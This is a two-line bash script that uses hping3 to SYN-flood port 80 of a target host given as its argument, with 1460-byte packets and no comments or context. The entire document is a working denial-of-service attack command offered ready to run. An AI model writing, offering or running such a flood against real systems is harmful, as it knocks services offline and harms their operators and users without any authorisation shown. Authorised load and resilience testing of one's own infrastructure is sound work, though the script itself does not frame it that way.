#!/bin/bash
hping3 -S --flood -p 80 -d 1460 "$1"
